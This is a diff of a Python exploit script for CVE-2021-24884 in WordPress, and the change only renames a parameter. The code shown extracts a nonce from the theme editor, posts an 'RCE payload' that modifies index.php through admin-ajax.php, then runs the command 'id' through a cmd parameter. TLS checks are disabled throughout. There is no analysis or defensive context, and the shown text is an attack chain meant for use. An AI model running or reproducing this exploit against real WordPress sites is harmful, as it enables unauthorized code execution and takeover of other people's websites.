@@ -9,9 +9,9 @@ from colorama import init, Fore, Style
 init(autoreset=True)
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-def extract_wp_nonce(target):
+def extract_wp_nonce(profile_url):
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Extracting wp_nonce from the theme editor page...")
-    editor_url = f"{target}/wp-admin/theme-editor.php?file=index.php"
+    editor_url = f"{profile_url}/wp-admin/theme-editor.php?file=index.php"
     
     try:
         response = requests.get(editor_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
@@ -31,7 +31,7 @@ def extract_wp_nonce(target):
     
     return None
 
-def modify_index_file(target, wp_nonce):
+def modify_index_file(profile_url, wp_nonce):
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Attempting to modify index.php with RCE payload...")
     
     payload = {
@@ -48,7 +48,7 @@ def modify_index_file(target, wp_nonce):
     }
     
     try:
-        ajax_url = f"{target}/wp-admin/admin-ajax.php"
+        ajax_url = f"{profile_url}/wp-admin/admin-ajax.php"
         response = requests.post(ajax_url, headers={"User-Agent": "Mozilla/5.0"}, data=payload, verify=False, timeout=30)
         
         if response.status_code == 200 and "true" in response.text:
@@ -61,11 +61,11 @@ def modify_index_file(target, wp_nonce):
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error during modification attempt: {e}")
         return False
 
-def trigger_rce(target):
+def trigger_rce(profile_url):
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Triggering RCE via cmd parameter...")
     
     try:
-        rce_url = f"{target}/index.php?cmd=id"
+        rce_url = f"{profile_url}/index.php?cmd=id"
         response = requests.get(rce_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
         
         if response.status_code == 200:
@@ -75,12 +75,12 @@ def trigger_rce(target):
     except Exception as e:
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error triggering RCE: {e}")
 
-def scan_cve_2021_24884(target):
-    wp_nonce = extract_wp_nonce(target)
+def scan_cve_2021_24884(profile_url):
+    wp_nonce = extract_wp_nonce(profile_url)
     
     if wp_nonce:
-        if modify_index_file(target, wp_nonce):
-            trigger_rce(target)
+        if modify_index_file(profile_url, wp_nonce):
+            trigger_rce(profile_url)
         else:
             print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed.")
     else:
